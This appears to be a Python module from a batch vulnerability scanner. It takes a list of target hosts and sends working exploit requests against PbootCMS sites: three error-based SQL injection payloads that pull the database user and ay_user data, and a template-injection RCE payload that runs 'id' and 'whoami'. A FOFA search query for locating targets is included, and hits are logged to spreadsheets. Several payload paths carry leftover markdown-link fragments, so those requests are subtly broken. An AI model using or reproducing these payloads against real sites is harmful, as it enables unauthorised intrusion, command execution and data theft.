

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import tools.GlobalTool as Tool
import tools.HttpTool as NetWork


def help():
    print('''
    fofa: app="PBOOTCMS"
        1. PbootCMS domain SQL注入漏洞, PbootCMS <= 3.0.5
        2. PbootCMS ext_price SQL注入漏洞, PbootCMS < 1.2.1
        3. PbootCMS search SQL注入漏洞, PbootCMS < 1.2.1
        4. PbootCMS V3.1.2 正则绕过 RCE 漏洞
    x. 退出
    ''')

def vul_domain(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Accept': '*/*',
    }
    body = ''
    method = "GET"
    path = "/?domain/13'.html"
    notes = ""
    return (url, method, headers, body, path, notes)

def vul_ext_price(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Accept': '*/*',
    }
    body = ''
    method = "GET"
    path = "/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123)"
    notes = ""
    return (url, method, headers, body, path, notes)

def vul_search(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Accept': '*/*',
    }
    body = ''
    method = "GET"
    path = "/index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123)"
    notes = ""
    return (url, method, headers, body, path, notes)

def vul_function_Linux(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Accept': 'text/plain, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
    }
    body = ''
    method = "GET"
    path = "/index.php/keyword?keyword=}{pboot:if((get_lg/*aaa-*/())/**/(get_backurl/*aaa-*/()))}123321aaa{/pboot:if}&backurl=;id"
    notes = ""
    return (url, method, headers, body, path, notes)

def vul_function_Windows(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Accept': 'text/plain, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
    }
    body = ''
    method = "GET"
    path = '/?member/login/?a=}{pboot:if((get_lg/*aaa-*/())/**/("whoami"))}{/pboot:if}'
    notes = ""
    return (url, method, headers, body, path, notes)


def run():
    OUTDIR = "result/PbootCMS"
    # 获取当前日期和时间
    formatted_datetime = Tool.getime()
    file = "dat.txt"
    li = Tool.read_host_file(file)
    Tool.mkdir(OUTDIR)
    help()
    num = int(input("执行的指令: "))
    if num == 1:
        data = []
        for url in li:
            item = vul_domain(url)
            data.append(item)
        s = NetWork.HttpTool
        y = s.async_httpx_start(data)

        res = []
        vul = []
        for k, v in y.items():
            if "错误" in v[3] and "SQL" in v[3]:
                print(f"[+]{v[0]} -> 存在SQL注入")
                vul.append([v[0], '存在SQL注入', k])
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '状态', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}-PbootCMS domain SQL注入漏洞.xlsx")
        ti = ['地址', '风险', 'POC']
        Tool.write_to_xlsx(ti, vul, f"{OUTDIR}/{formatted_datetime}-PbootCMS domain SQL注入漏洞.xlsx", 2)

    elif num == 2:
        data = []
        for url in li:
            item = vul_ext_price(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        vul = []
        for k, v in y.items():
            if "错误" in v[3] and "SQL" in v[3]:
                print(f"[+]{v[0]} -> 存在SQL注入")
                vul.append([v[0], '存在SQL注入', k])
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '状态', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}-PbootCMS ext_price SQL注入漏洞.xlsx")
        ti = ['地址', '风险', 'POC']
        Tool.write_to_xlsx(ti, vul, f"{OUTDIR}/{formatted_datetime}-PbootCMS ext_price SQL注入漏洞.xlsx", 2)

    elif num == 3:
        data = []
        for url in li:
            item = vul_search(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        vul = []
        for k, v in y.items():
            if "错误" in v[3] and "SQL" in v[3]:
                print(f"[+]{v[0]} -> 存在SQL注入")
                vul.append([v[0], '存在SQL注入', k])
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '状态', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}-PbootCMS search SQL注入漏洞.xlsx")
        ti = ['地址', '风险', 'POC']
        Tool.write_to_xlsx(ti, vul, f"{OUTDIR}/{formatted_datetime}-PbootCMS search SQL注入漏洞.xlsx", 2)

    elif num == 4:
        data = []
        for url in li:
            item = vul_function_Windows(url)
            data.append(item)
        for url in li:
            item = vul_function_Linux(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '状态', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}-PbootCMS V3.1.2 正则绕过 RCE 漏洞.xlsx")

    else:
        print('bye....')
